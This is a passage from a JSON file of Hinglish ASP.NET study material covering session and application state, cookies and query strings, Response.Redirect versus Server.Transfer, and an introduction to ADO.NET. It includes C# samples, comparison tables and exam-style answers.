        "answer": "Dono server-side state hain, par scope alag hai.\n\n**Session state** — per user:\n- Object: `HttpSessionState`, access `Session[\"key\"]`.\n- Har user ka apna SessionID (cookie `ASP.NET_SessionId` ya cookieless URL mein).\n- Values saare pages par available; timeout ke baad (default **20 min**, sliding) khatam.\n- Modes: **InProc** (default), **StateServer**, **SQLServer**, Custom, Off.\n- Events: `Session_Start`, `Session_End` (Global.asax, sirf InProc).\n- Use: login, shopping cart, user profile, filters.\n\n**Application state** — sab users ke liye ek:\n- Object: `HttpApplicationState`, access `Application[\"key\"]`.\n- Application start par banta hai, app pool restart par khatam.\n- Events: `Application_Start`, `Application_End`.\n- Concurrent write ke liye `Application.Lock()` / `Application.UnLock()`.\n- Use: site-wide counter, config values, shared lookup.\n\n| Point | Session | Application |\n|---|---|---|\n| Scope | ek user | sab users |\n| Lifetime | timeout tak | app start → end |\n| ID | SessionID | koi nahi |\n| Concurrency | safe (per user) | Lock/UnLock chahiye |\n| Example | `Session[\"user\"]=\"riya\"` | `Application[\"visits\"]=10` |\n\n**Code:**\n```csharp\nSession[\"user\"] = txtUser.Text;\nApplication.Lock();\nApplication[\"visits\"] = (int)Application[\"visits\"] + 1;\nApplication.UnLock();\n```\n\n**Diagram:** Refer to the Session vs Application State diagram."
      },
      {
        "question": "Explain the session state modes available in ASP.NET with their advantages and disadvantages.",
        "answer": "`Web.config` ke `<sessionState mode=\"...\">` se mode choose karte hain.\n\n**1. InProc (default)** — session IIS worker process ke memory mein.\n- Fayda: fastest, setting nahi chahiye.\n- Nuksaan: app pool recycle/restart par session khatam; web farm mein share nahi; `Session_End` sirf yahan chalta hai.\n\n**2. StateServer** — alag `aspnet_state.exe` service (Windows service, TCP port 42424).\n```xml\n<sessionState mode=\"StateServer\"\n  stateConnectionString=\"tcpip=127.0.0.1:42424\" />\n```\n- Fayda: restart survive, multiple servers share kar sakte hain.\n- Nuksaan: objects **serialisable** hone chahiye; network round-trip se slow.\n\n**3. SQL Server** — session data SQL Server ki `ASPState`/tempdb table mein.\n```xml\n<sessionState mode=\"SQLServer\"\n  sqlConnectionString=\"data source=.;integrated security=SSPI\" />\n```\n- Fayda: sabse reliable, server crash ke baad bhi session safe, web farm ke liye best.\n- Nuksaan: sabse slow, DB maintain karna padta hai.\n\n**4. Custom** — apna `SessionStateStoreProviderBase` (jaise Redis/Memcached provider).\n\n**5. Off** — session band (`Session[\"x\"]` error dega); stateless pages ke liye.\n\n**Extra:** `cookieless=\"UseUri\"` se SessionID URL mein; `timeout` minutes mein.\n\n**Diagram:** Refer to the Session vs Application State diagram."
      },
      {
        "question": "Why is Lock/UnLock required in Application state? Illustrate with a visit counter example.",
        "answer": "**Reason:** Application object **sab users ke liye ek hi** hai, aur IIS kai requests ko **parallel** threads par chalata hai. Do threads agar ek saath `Application[\"visits\"]` padhein, dono ko same purani value milegi, dono +1 karke likhenge — **ek increment kho jaayega** (race condition).\n\n**Bina lock (galat):**\n```csharp\nint n = (int)Application[\"visits\"];\nApplication[\"visits\"] = n + 1;   // do threads ne same n padha -> ek update gayab\n```\n\n**Lock ke saath (sahi):**\n```csharp\nApplication.Lock();\ntry\n{\n    int n = (int)Application[\"visits\"];\n    Application[\"visits\"] = n + 1;\n}\nfinally\n{\n    Application.UnLock();\n}\n```\n\n**Example — Global.asax:**\n```csharp\nvoid Application_Start(object sender, EventArgs e)\n{\n    Application[\"visits\"] = 0;\n}\n\nvoid Session_Start(object sender, EventArgs e)\n{\n    Application.Lock();\n    Application[\"visits\"] = (int)Application[\"visits\"] + 1;\n    Application.UnLock();\n}\n```\n\n**Page par:** `lbl.Text = \"Total: \" + Application[\"visits\"];`\n\n**Important baatein:**\n- `Lock()` poore application ko block karta hai — andar **lamba kaam (DB/file) na karo**, warna site slow.\n- `try/finally` use karo taaki exception par bhi UnLock ho.\n- Sab sirf padhne wale data (config) ke liye lock ki zaroorat nahi.\n- Web farm mein har server ka apna Application object — global counter ke liye **database** use karo.\n\n**Diagram:** Refer to the Session vs Application State diagram."
      }
    ]
  },
  {
    "id": "cookies-querystring",
    "number": "4.9",
    "title": "Cookies and Query Strings",
    "subtitle": "Browser-side state — chhota, client ke paas, aur sambhal ke",
    "icon": "link",
    "accent": "#ff8800",
    "englishDefinition": "Cookies and query strings are client-side state mechanisms in ASP.NET. A cookie is a small text file (about 4 KB) that the web server sends to the browser via the Set-Cookie HTTP header and the browser returns on every subsequent request to that domain; ASP.NET creates cookies with Response.Cookies, reads them with Request.Cookies, and they may be persistent (Expires set, stored on disk) or session cookies (no expiry, deleted when the browser closes), single-valued or multi-valued (subkeys), scoped with Domain and Path, and protected with HttpOnly and Secure flags. A query string is the part of the URL after the question mark (?key=value&key2=value2) that ASP.NET exposes through Request.QueryString; it is ideal for small, non-sensitive values such as an ID, a filter or a bookmarkable search, because the URL can be copied, bookmarked and seen by everyone, and browsers/servers limit its length (about 2 KB practical). Neither mechanism should carry passwords or confidential data - cookies can be read and edited by the user, query strings are visible in the address bar, history, proxy logs and referrer headers, so values must be validated (and parameterised before use in SQL) on the server.",
    "intro": "Ye dono techniques **client ke paas** data rakhti hain — isliye sasti aur simple hain, par **private nahi**. **Cookie** browser ki chhoti file (~4 KB) hoti hai jo har request ke saath server ko wapas jaati hai; **query string** URL ka wo part hai jo `?` ke baad aata hai (`Result.aspx?roll=21`). Yaad rakho: password, token, price jaisa sensitive data inmein kabhi nahi — user padh bhi sakta hai aur badal bhi sakta hai.",
    "sections": [
      {
        "type": "definition",
        "title": "Cookies aur query string",
        "kicker": "Definition",
        "body": "**Cookie** = browser ke paas rakha chhota text (name=value), server `Set-Cookie` header se bhejta hai aur browser us domain ki har request mein wapas bhejta hai. ASP.NET mein `Response.Cookies[...]` likhne ke liye, `Request.Cookies[...]` padhne ke liye.",
        "body2": "**Query string** = URL ka `?key=value&key2=value2` wala hissa; `Request.QueryString['key']` se padha jaata hai. Chhota, shareable, bookmarkable data — jaise `?id=21` ya `?page=2`.",
        "chips": [
          "cookie ~4 KB",
          "Response/Request.Cookies",
          "?key=value",
          "Request.QueryString",
          "not secure"
        ]
      },
      {
        "type": "comparison",
        "title": "Cookies vs Query String",
        "kicker": "Comparison",
        "columns": [
          "Cookie",
          "Query String"
        ],
        "rows": [
          {
            "label": "Kahan",
            "values": [
              "browser (client disk/memory)",
              "URL (address bar)"
            ]
          },
          {
            "label": "Likho",
            "values": [
              "Response.Cookies[\"k\"].Value",
              "URL banana (link/Redirect)"
            ]
          },
          {
            "label": "Padho",
            "values": [
              "Request.Cookies[\"k\"].Value",
              "Request.QueryString[\"k\"]"
            ]
          },
          {
            "label": "Size",
            "values": [
              "~4 KB per cookie",
              "URL length tak (~2 KB practical)"
            ]
          },
          {
            "label": "Lifetime",
            "values": [
              "Expires tak / browser band hone tak",
              "us link/request tak"
            ]
          },
          {
            "label": "User ko dikhta",
            "values": [
              "file/browser settings mein",
              "seedha URL mein"
            ]
          },
          {
            "label": "Sharing",
            "values": [
              "domain ke saare pages",
              "link copy/email kar sakte ho"
            ]
          },
          {
            "label": "Best use",
            "values": [
              "theme, remember-me, language",
              "id, search, paging, filters"
            ]
          }
        ],
        "columnColors": [
          "#ff8800",
          "#00d4ff"
        ]
      },
      {
        "type": "codeoutput",
        "kicker": "Code + Output",
        "title": "Cookies — likhna, padhna, mitana",
        "code": "using System;\n\npublic partial class Theme : System.Web.UI.Page\n{\n    protected void Page_Load(object sender, EventArgs e)\n    {\n        if (!IsPostBack)\n        {\n            // padhna (null check zaroori)\n            HttpCookie c = Request.Cookies[\"theme\"];\n            lblTheme.Text = \"Theme: \" + (c != null ? c.Value : \"light\");\n        }\n    }\n\n    protected void btnDark_Click(object sender, EventArgs e)\n    {\n        HttpCookie c = new HttpCookie(\"theme\", \"dark\");\n        c.Expires = DateTime.Now.AddDays(30);   // persistent\n        c.HttpOnly = true;                      // JS se na padhe\n        c.Secure = true;                        // sirf HTTPS\n        Response.Cookies.Add(c);\n\n        lblTheme.Text = \"Theme: dark\";\n    }\n\n    protected void btnDelete_Click(object sender, EventArgs e)\n    {\n        HttpCookie c = new HttpCookie(\"theme\", \"\");\n        c.Expires = DateTime.Now.AddDays(-1);   // expire karke delete\n        Response.Cookies.Add(c);\n    }\n}",
        "language": "csharp",
        "filename": "Theme.aspx.cs",
        "php": "Theme: light          (pehli baar)\n\n[ Dark ]  ->  Theme: dark\n(30 din tak dark hi rahega, browser band karne par bhi)\n\n[ Reset ] ->  Theme: light      (cookie delete)",
        "label": "Rendered output",
        "height": 230,
        "outputHint": "ASP.NET · rendered output",
        "outputNote": "ASP.NET server par compile hota hai — browser ko sirf rendered HTML milta hai.",
        "intro": "Cookie likhne ke liye `Response.Cookies`, padhne ke liye `Request.Cookies`; delete karne ke liye past expiry."
      },
      {
        "type": "codeoutput",
        "kicker": "Code + Output",
        "title": "Query string — value bhejna aur padhna",
        "code": "// Sender page — link/redirect se value bhejo\nstring url = \"Result.aspx?roll=21&name=Riya&sem=3\";\nResponse.Redirect(url);\n\n// Ya HyperLink se\n// <asp:HyperLink runat=\"server\"\n//    NavigateUrl=\"Result.aspx?roll=21\" Text=\"View\" />\n\n// Receiver page (Result.aspx)\nprotected void Page_Load(object sender, EventArgs e)\n{\n    string roll = Request.QueryString[\"roll\"];   // \"21\"\n    string name = Request.QueryString[\"name\"];   // \"Riya\"\n    string sem  = Request.QueryString[\"sem\"];    // \"3\"\n    string bad  = Request.QueryString[\"xyz\"];    // null\n\n    if (string.IsNullOrEmpty(roll))\n    {\n        lblMsg.Text = \"Roll number missing!\";\n        return;\n    }\n\n    // SQL ke liye: parameterised query (injection se bachao)\n    lblMsg.Text = \"Roll: \" + roll + \" | Name: \" + name + \" | Sem: \" + sem;\n}",
        "language": "csharp",
        "filename": "Result.aspx.cs",
        "php": "URL: Result.aspx?roll=21&name=Riya&sem=3\n\nPage: Roll: 21 | Name: Riya | Sem: 3\n\nURL: Result.aspx            ->  \"Roll number missing!\"",
        "label": "Rendered output",
        "height": 230,
        "outputHint": "ASP.NET · rendered output",
        "outputNote": "ASP.NET server par compile hota hai — browser ko sirf rendered HTML milta hai.",
        "intro": "Query string se aane wali value **string** hoti hai aur `null` bhi ho sakti hai — validate karo."
      },
      {
        "type": "points",
        "title": "Suraksha aur best practices",
        "kicker": "Security",
        "points": [
          "**Sensitive data kabhi nahi:** password, token, price, role — cookie/query string user badal sakta hai.",
          "**Cookie flags:** `HttpOnly = true` (XSS se JS padh na sake), `Secure = true` (sirf HTTPS), `SameSite = Lax` (CSRF kam).",
          "**Query string validate karo:** `int.TryParse`, length limit, allowed values — warna 500 error ya injection.",
          "**SQL injection:** query string se aayi value **parameterised query** mein hi daalo, string concat se nahi.",
          "**Encryption:** chhota sensitive payload ho to `FormsAuthentication.Encrypt` ya `MachineKey.Protect` karke bhejo.",
          "**Encoding:** `HttpUtility.UrlEncode` / `Server.HtmlEncode` se XSS roko.",
          "**Cookie limit:** browser per-domain ~50 cookies, ~4 KB each — bahut saara data na thopo."
        ]
      },
      {
        "type": "diagram",
        "title": "Cookies vs Query String",
        "kicker": "Diagram",
        "diagram": "wt4-cookies",
        "caption": "Cookie: browser ke paas, har request ke saath · Query string: URL mein, link ke saath"
      },
      {
        "type": "recap",
        "title": "Recap",
        "kicker": "Revise",
        "points": [
          "**Cookie:** ~4 KB text, `Response.Cookies` se likho, `Request.Cookies` se padho.",
          "**Persistent vs session cookie:** `Expires` set = disk par, warna browser band hone tak.",
          "**Delete:** same naam ki cookie past expiry ke saath bhejo.",
          "**Query string:** URL ka `?key=value`, `Request.QueryString['key']`, null ho sakta hai.",
          "**Use:** id, paging, filters, theme/remember-me — sensitive data nahi.",
          "**Security:** HttpOnly/Secure flags, validate + parameterise, encode output."
        ]
      }
    ],
    "examQuestions": [
      {
        "question": "What are cookies? Explain how to create, read and delete cookies in ASP.NET.",
        "answer": "**Cookie** ek chhota text (name=value) hai jo server browser ko bhejta hai; browser us domain ki har request ke saath wapas bhejta hai.\n\n**Types:**\n- **Persistent cookie** — `Expires` set, disk par save, browser band hone ke baad bhi.\n- **Session cookie** — expiry nahi, browser band hone par delete.\n- **Multi-valued cookie** — subkeys: `c[\"font\"] = \"Arial\"`.\n\n**Create (write):**\n```csharp\nHttpCookie c = new HttpCookie(\"theme\", \"dark\");\nc.Expires = DateTime.Now.AddDays(30);\nc.HttpOnly = true;\nc.Secure = true;\nResponse.Cookies.Add(c);\n```\n\n**Read:**\n```csharp\nHttpCookie c = Request.Cookies[\"theme\"];\nstring theme = (c != null) ? c.Value : \"light\";\n```\n\n**Delete:** same naam ki cookie past expiry ke saath bhejo:\n```csharp\nHttpCookie c = new HttpCookie(\"theme\", \"\");\nc.Expires = DateTime.Now.AddDays(-1);\nResponse.Cookies.Add(c);\n```\n\n**Limits:** ~4 KB per cookie, per domain ~50 cookies; browser har request ke saath bhejta hai isliye bahut saara data page slow karta hai.\n\n**Security:** cookie user padh/badal sakta hai — password, price, role na rakho; `HttpOnly`, `Secure`, `SameSite` flags; zaroorat ho to data encrypt karo.\n\n**Diagram:** Refer to the Cookies vs Query String diagram."
      },
      {
        "question": "What is a query string? Explain its advantages, limitations and how to read it securely.",
        "answer": "**Query string** URL ka wo hissa hai jo `?` ke baad aata hai — `Result.aspx?roll=21&name=Riya`.\n\n**Padhna:**\n```csharp\nstring roll = Request.QueryString[\"roll\"];   // \"21\" ya null\n```\n\n**Fayde:**\n- Simple — koi server storage nahi.\n- **Bookmark/share** ho sakta hai (search result, product page).\n- Browser back/history ke saath chalta hai, SEO friendly links.\n- Server par state memory nahi lagti.\n\n**Limitations:**\n- URL ki length limited (~2 KB practical).\n- Sabko dikhta hai — history, logs, proxy, referrer.\n- User badal sakta hai → **kabhi trust na karo**.\n- Sensitive data ke liye galat; encode karna padta hai (space, &, =).\n\n**Secure tarika:**\n```csharp\nint roll;\nif (!int.TryParse(Request.QueryString[\"roll\"], out roll))\n{\n    lblMsg.Text = \"Invalid roll number\";\n    return;\n}\nusing (SqlCommand cmd = new SqlCommand(\n        \"SELECT * FROM Student WHERE Roll = @r\", con))\n{\n    cmd.Parameters.AddWithValue(\"@r\", roll);   // parameterised\n    ...\n}\n```\n\n**Kab use karein:** ID, filter, paging (`?page=3`), search query, tracking parameter.\n**Kab na karein:** password, price, role, koi bhi confidential data.\n\n**Diagram:** Refer to the Cookies vs Query String diagram."
      },
      {
        "question": "Compare cookies and query strings with respect to storage, size, security and usage.",
        "answer": "Dono client-side state hain, par behaviour alag.\n\n| Point | Cookie | Query string |\n|---|---|---|\n| Kahan store | browser (disk/memory) | URL |\n| Create | `Response.Cookies[\"k\"].Value = v` | URL banana / `Response.Redirect` |\n| Read | `Request.Cookies[\"k\"].Value` | `Request.QueryString[\"k\"]` |\n| Size | ~4 KB per cookie | URL length tak (~2 KB) |\n| Lifetime | `Expires` tak / session | us link/request tak |\n| Visible to user | browser settings mein | address bar mein turant |\n| Share/bookmark | nahi (browser-specific) | haan (link copy) |\n| Server load | har request mein bhejta hai | chhota, URL ke saath |\n| Security risk | user edit kar sakta hai | user edit + logs mein leak |\n| Best use | theme, language, remember-me | id, paging, filter, search |\n\n**Common points:** dono client-side hain isliye **kabhi sensitive data na rakho**; dono ki value validate karo; SQL mein parameterised query use karo; XSS ke liye encode karo.\n\n**Kab kaunsa:** value link ke saath share karni hai → query string; value browser ko yaad rakhni hai (site-wide, kai pages) → cookie.\n\n**Diagram:** Refer to the Cookies vs Query String diagram."
      }
    ]
  },
  {
    "id": "redirect-transfer",
    "number": "4.10",
    "title": "Response.Redirect and Server.Transfer",
    "subtitle": "Client-side redirect vs server-side transfer — farq aur kab kaunsa",
    "icon": "arrow",
    "accent": "#00d4ff",
    "englishDefinition": "Response.Redirect and Server.Transfer both move the user to another page, but at different layers. Response.Redirect sends an HTTP 302 (or 301 with endResponse and a status code) response to the browser telling it to request a new URL; the browser issues a fresh request, so the URL in the address bar changes, the round trip costs an extra request, and the new page executes as a new request with its own page lifecycle and session (view state and form data are lost). Server.Transfer executes the target page on the server with the same request (Server.Execute is the variant that returns to the caller), so no extra round trip occurs, the browser URL stays unchanged, context and form/query values are available via the second page, and Server.Transfer requires the target to be on the same server (and, unless enabled, the same application); it can also pass a preserveForm=true argument. Because Server.Transfer hides the URL it is unsuitable for public navigation and hurts SEO/bookmarking and refresh handling, while Response.Redirect is the normal choice after login/logout or for moving to another site; Response.Redirect also raises ThreadAbortException unless the overload with endResponse=false is used.",
    "intro": "Dono ka kaam ek jaisa lagta hai — 'doosre page par le jao' — par andar se bilkul alag. **Response.Redirect** browser ko bolta hai *'jao ye URL kholo'* (extra round trip, URL badalta hai). **Server.Transfer** server ke andar hi doosra page chala deta hai (round trip nahi, URL wahi ka wahi). Interview mein ye 5–6 point ka comparison bahut poochha jaata hai; aur ye bhi ki **Server.Execute** kya hai.",
    "sections": [
      {
        "type": "definition",
        "title": "Redirect aur Transfer",
        "kicker": "Definition",
        "body": "**Response.Redirect(url)** browser ko **302** status bhejta hai; browser naya request karta hai — address bar naya URL dikhata hai, page naye sir se (naya lifecycle) chalta hai.",
        "body2": "**Server.Transfer(path)** browser ko kuch nahi bolta — server ke andar hi target page ko execute kar deta hai, URL change nahi hota, aur transfer ke baad control wapas nahi aata. **Server.Execute(path)** same server par page chala kar **wapas** aata hai (include jaisa).",
        "chips": [
          "Response.Redirect → 302",
          "Server.Transfer → same request",
          "URL change",
          "Server.Execute"
        ]
      },
      {
        "type": "comparison",
        "title": "Response.Redirect vs Server.Transfer",
        "kicker": "Comparison",
        "columns": [
          "Response.Redirect",
          "Server.Transfer"
        ],
        "rows": [
          {
            "label": "Kahan hota",
            "values": [
              "client/browser level",
              "server level"
            ]
          },
          {
            "label": "Round trip",
            "values": [
              "extra request (2 requests)",
              "ek hi request"
            ]
          },
          {
            "label": "URL bar",
            "values": [
              "naya URL dikhta hai",
              "purana URL hi rehta hai"
            ]
          },
          {
            "label": "Speed",
            "values": [
              "thoda slow",
              "fast (server ke andar)"
            ]
          },
          {
            "label": "Target",
            "values": [
              "koi bhi site/URL (bahar bhi)",
              "same server (aur aksar same app)"
            ]
          },
          {
            "label": "Form/query data",
            "values": [
              "chala jaata hai",
              "preserveForm=true se milta hai"
            ]
          },
          {
            "label": "SEO/bookmark",
            "values": [
              "theek (URL sach dikhta hai)",
              "galat (URL dhoka)"
            ]
          },
          {
            "label": "Refresh par",
            "values": [
              "safe",
              "postback dobara ho sakta hai"
            ]
          },
          {
            "label": "Kab use",
            "values": [
              "login ke baad, external site",
              "internal page switch, URL chhupana"
            ]
          }
        ],
        "columnColors": [
          "#00d4ff",
          "#ff8800"
        ]
      },
      {
        "type": "code",
        "title": "Dono ka syntax aur Server.Execute",
        "kicker": "Code",
        "code": "// 1. Response.Redirect — browser naya request karega\nResponse.Redirect(\"Welcome.aspx\");\nResponse.Redirect(\"Welcome.aspx\", false);        // endResponse=false\nResponse.Redirect(\"https://example.com\");         // doosri site bhi\n\n// 2. Server.Transfer — server ke andar, URL same\nServer.Transfer(\"Welcome.aspx\");\nServer.Transfer(\"Welcome.aspx\", true);            // preserveForm = true\n\n// 3. Server.Execute — page chala kar wapas aata hai\nServer.Execute(\"Header.aspx\");\n\n// 4. transfer ke baad target page par purani values\n//    (sirf preserveForm=true ke saath)\n// Target.aspx:\n//   Request.Form[\"txtName\"]      // transfer se aayi value\n//   PreviousPage.FindControl(\"txtName\")",
        "language": "csharp",
        "filename": "Navigation.aspx.cs",
        "intro": "Redirect ke baad code chalta rehta hai — `return;` ya `endResponse=true` use karo.",
        "note": "Redirect ke baad `ThreadAbortException` aata hai (ASP.NET request abort karta hai) — `try/catch` ya `false` overload."
      },
      {
        "type": "codeoutput",
        "kicker": "Code + Output",
        "title": "Redirect vs Transfer — URL aur data",
        "code": "protected void btnGo_Click(object sender, EventArgs e)\n{\n    Session[\"msg\"] = \"Hello from \" + txtName.Text;\n    lblInfo.Text = \"\";\n}\n\n// Case A: browser URL badalta hai\nprotected void btnRedirect_Click(object sender, EventArgs e)\n{\n    Response.Redirect(\"Welcome.aspx?from=redirect\");\n}\n\n// Case B: browser URL wahi rehta hai\nprotected void btnTransfer_Click(object sender, EventArgs e)\n{\n    Server.Transfer(\"Welcome.aspx\");\n}\n\n// Welcome.aspx\nprotected void Page_Load(object sender, EventArgs e)\n{\n    lblMsg.Text = Session[\"msg\"] as string;\n    lblFrom.Text = Request.QueryString[\"from\"] ?? \"(no query)\";\n}",
        "language": "csharp",
        "filename": "Navigation.aspx.cs",
        "php": "Case A — Response.Redirect\nURL bar:  /Welcome.aspx?from=redirect     <-- badal gaya\nPage:     Hello from Riya | redirect\n\nCase B — Server.Transfer\nURL bar:  /Navigation.aspx                <-- wahi hai\nPage:     Hello from Riya | (no query)",
        "label": "Rendered output",
        "height": 240,
        "outputHint": "ASP.NET · rendered output",
        "outputNote": "ASP.NET server par compile hota hai — browser ko sirf rendered HTML milta hai.",
        "intro": "Transfer mein query string nahi jaata — data bhejne ke liye Session, Context.Items ya preserveForm use karo."
      },
      {
        "type": "points",
        "title": "Zaroori points",
        "kicker": "Traps",
        "points": [
          "**Redirect 301 vs 302:** permanent move ke liye 301 (`RedirectPermanent`), temporary ke liye 302 (default).",
          "**ThreadAbortException:** `Response.Redirect(url)` request abort karta hai; `Redirect(url, false)` ya `return` se bacho.",
          "**Transfer ke baad:** target page chalti hai par pehle page ka baaki code execute hota rehta hai (`Response.End()` se roko).",
          "**Cross-application:** Server.Transfer doosri application/site par nahi ja sakta (IIS 7+ mein `serverTransfer` enable karke same server par).",
          "**Data bhejne ke tarike:** Session, `Context.Items['key']` (same request), query string (redirect), `PreviousPage`.",
          "**Response.Redirect vs Server.Execute:** Execute target chala kar **wapas** aata hai — layout/include ke liye."
        ]
      },
      {
        "type": "diagram",
        "title": "Redirect vs Transfer",
        "kicker": "Diagram",
        "diagram": "wt4-transfer",
        "caption": "Redirect: server → 302 → browser → naya request · Transfer: server ke andar hi doosra page"
      },
      {
        "type": "recap",
        "title": "Recap",
        "kicker": "Revise",
        "points": [
          "**Response.Redirect:** 302 → browser naya request; URL badalta hai; koi bhi site; extra round trip.",
          "**Server.Transfer:** same request, server par hi page change; URL same; sirf same server.",
          "**Server.Execute:** page chala kar wapas (include jaisa).",
          "**Data:** redirect → query string/session; transfer → Session, Context.Items, preserveForm.",
          "**ThreadAbortException** redirect ke baad aata hai — `false` overload ya `return`.",
          "**SEO/bookmark:** redirect behtar; transfer URL chhupata hai."
        ]
      }
    ],
    "examQuestions": [
      {
        "question": "Differentiate between Response.Redirect and Server.Transfer with suitable examples.",
        "answer": "Dono navigation karte hain, par level aur behaviour alag hai.\n\n| Point | Response.Redirect | Server.Transfer |\n|---|---|---|\n| Level | client/browser | server |\n| HTTP | 302 status bhejta hai | koi redirect nahi |\n| Requests | 2 (extra round trip) | 1 |\n| URL bar | naya URL | purana URL hi |\n| Speed | slow | fast |\n| Target | koi bhi URL (external bhi) | same server |\n| Data | query string/session | Session, Context.Items, preserveForm |\n| SEO | sahi | URL galat dikhta hai |\n| Refresh | safe | postback repeat ho sakta |\n\n**Examples:**\n```csharp\n// login ke baad — URL badalna chahiye\nSession[\"user\"] = txtUser.Text;\nResponse.Redirect(\"Dashboard.aspx\");\n\n// internal switch — URL chhupana hai\nContext.Items[\"msg\"] = \"Saved!\";\nServer.Transfer(\"Result.aspx\");\n```\n\n**Server.Execute** teesra variant hai — target page chala kar **wapas** laut aata hai (header/footer include ke liye).\n\n**Practical baatein:** Redirect ke baad `ThreadAbortException` aata hai — `Response.Redirect(url, false)` ya `return;` use karo. Transfer ke baad pehle page ka baaki code chal sakta hai — `Response.End()`.\n\n**Diagram:** Refer to the Redirect vs Transfer diagram."
      },
      {
        "question": "Explain the different ways to pass data from one page to another in ASP.NET.",
        "answer": "ASP.NET mein page-to-page data bhejne ke kai tarike hain:\n\n**1. Query string**\n```csharp\nResponse.Redirect(\"Result.aspx?roll=21\");\nstring r = Request.QueryString[\"roll\"];\n```\nFayda: simple, bookmarkable · Nuksaan: visible, length limit, sensitive data nahi.\n\n**2. Session**\n```csharp\nSession[\"roll\"] = 21;   // sender\nint r = (int)Session[\"roll\"];   // receiver\n```\nFayda: secure, object bhi · Nuksaan: server memory, timeout.\n\n**3. Cookie**\n```csharp\nResponse.Cookies[\"roll\"].Value = \"21\";\n```\nFayda: browser-level · Nuksaan: chhota, client badal sakta.\n\n**4. Server.Transfer + Context.Items / preserveForm**\n```csharp\nContext.Items[\"msg\"] = \"Saved\";\nServer.Transfer(\"Result.aspx\");        // URL same\n```\n\n**5. PreviousPage (cross-page posting)**\n```html\n<asp:Button runat=\"server\" PostBackUrl=\"~/Result.aspx\" Text=\"Next\" />\n```\n```csharp\nTextBox t = (TextBox)PreviousPage.FindControl(\"txtName\");\n```\n\n**6. Application / Cache** — site-wide data, per-user nahi.\n**7. Database** — bada ya permanent data (sabse reliable).\n\n**Kaunsa chune:** sensitive + bada → Session/DB; chhota + shareable → query string; browser remember → cookie; same-request internal → Context.Items.\n\n**Diagram:** Refer to the Redirect vs Transfer diagram."
      },
      {
        "question": "Explain Server.Execute and how it differs from Server.Transfer.",
        "answer": "**Server.Execute(path)** same server par doosre page ko execute karta hai aur uske output ko current page ke response mein include karke **wapas** aata hai — control caller ke paas hi rehta hai.\n\n**Server.Transfer(path)** target page ko execute karta hai par **wapas nahi aata** — request ka control permanently target page ko chala jaata hai.\n\n| Point | Server.Execute | Server.Transfer |\n|---|---|---|\n| Control wapas | haan (caller continue) | nahi |\n| Use | include (header/footer), partial render) | page switch |\n| URL | same | same |\n| Round trip | nahi | nahi |\n| Output | caller ke response mein | target ka response |\n| Data | `Context.Items`, query | `Context.Items`, `preserveForm=true` |\n\n**Execute example:**\n```csharp\n// Default.aspx — header chala kar include karo\nServer.Execute(\"Header.aspx\");\nlblMain.Text = \"Body content\";\n```\nHeader.aspx ka HTML Default.aspx ke beech mein aa jaata hai.\n\n**Transfer example:**\n```csharp\nServer.Transfer(\"Result.aspx\");\n```\n\n**Note:** Dono same server par hi chalte hain; cross-application nahi. Transfer ke baad caller ka code chalta reh sakta hai — `Response.End()` lagao.\n\n**Diagram:** Refer to the Redirect vs Transfer diagram."
      }
    ]
  },
  {
    "id": "ado-net",
    "number": "4.11",
    "title": "Introduction to ADO.NET",
    "subtitle": "Connection, Command, DataReader, DataAdapter, DataSet",
    "icon": "database",
    "accent": "#00e676",
    "englishDefinition": "ADO.NET is the data-access component of the .NET Framework: a set of classes in System.Data that let an application connect to a data source, execute commands and work with results independently of the page or form. It supports two models. The connected model uses a provider-specific DbConnection, DbCommand and a forward-only, read-only DataReader that keeps the connection open while rows are read; it is fast and memory-light and is used for simple reads. The disconnected model uses a DataAdapter that fills a DataSet or DataTable (an in-memory, XML-serialisable copy of the data) and then closes the connection; the changes are later written back with the adapter's Update method, which suits web applications where connections must be released quickly. The core objects are Connection, Command, DataReader, DataAdapter, DataSet, DataTable, DataView and Transaction, and the main providers are SqlClient (SQL Server), OleDb (OLE DB), Odbc and Oracle. ADO.NET is the successor of ADO and works with both connected and disconnected data, allows multiple result sets, and is the base on which LINQ to SQL and Entity Framework are built.",
    "intro": "ADO.NET = .NET ka **data access layer**. Chaar naam yaad rakho: **Connection** (database se link), **Command** (query chalao), **DataReader** (fast, forward-only, connection khula rehta hai), **DataAdapter + DataSet** (data memory mein copy, connection band). Web application mein connection jaldi band karna zaroori hai, isliye **disconnected model** ka concept important hai. Exam mein 'ADO.NET ke objects samjhao', 'connected vs disconnected', 'DataReader vs DataSet' — teen classic sawaal hain.",
    "sections": [
      {
        "type": "definition",
        "title": "ADO.NET kya hai",
        "kicker": "Basics",
        "body": "ADO.NET `System.Data` namespace ki classes ka set hai jo application ko **data source** se jodta hai — SQL Server, Oracle, Access, Excel, XML. Ye `System.Data.SqlClient` (SQL Server ke liye) ya `System.Data.OleDb` (baaki ke liye) jaise **providers** ke through kaam karta hai.",
        "body2": "Iska bada idea **disconnected data** hai: DataAdapter data ko `DataSet` mein copy karke connection band kar deta hai; page baad mein us copy par kaam karta hai. Web applications ke liye ye zaroori hai kyunki hazaron users ke liye connection khuli rakhna possible nahi.",
        "chips": [
          "System.Data",
          "SqlClient / OleDb",
          "connected + disconnected",
          "DataSet = memory copy"
        ]
      },
      {
        "type": "cards",
        "title": "ADO.NET ke core objects",
        "kicker": "Key Points",
        "cards": [
          {
            "icon": "plug",
            "title": "Connection",
            "body": "Database se link: `SqlConnection` (SQL Server) / `OleDbConnection`; connection string chahiye."
          },
          {
            "icon": "terminal",
            "title": "Command",
            "body": "SQL ya stored procedure chalata hai: `SqlCommand`; `ExecuteReader`, `ExecuteNonQuery`, `ExecuteScalar`."
          },
          {
            "icon": "zap",
            "title": "DataReader",
            "body": "Forward-only, read-only, **connected** — fast stream, ek waqt me ek row padhta hai."
          },
          {
            "icon": "layers",
            "title": "DataAdapter",
            "body": "Data lake aur DataSet fill karta hai; disconnected model ka bridge; `Update()` se wapas save."
          },
          {
            "icon": "database",
            "title": "DataSet / DataTable",
            "body": "Memory mein tables + relations; XML serialisable; navigate/filter karna easy."
          },
          {
            "icon": "arrows",
            "title": "Transaction",
            "body": "`SqlTransaction` — kai commands ek saath: `BeginTransaction`, `Commit`, `Rollback`."
          }
        ]
      },
      {
        "type": "comparison",
        "title": "Connected vs Disconnected model",
        "kicker": "Comparison",
        "columns": [
          "Connected",
          "Disconnected"
        ],
        "rows": [
          {
            "label": "Objects",
            "values": [
              "Connection + Command + DataReader",
              "DataAdapter + DataSet/DataTable"
            ]
          },
          {
            "label": "Connection",
            "values": [
              "khula rehta hai (close karo)",
              "fill ke baad band ho jaata hai"
            ]
          },
          {
            "label": "Data movement",
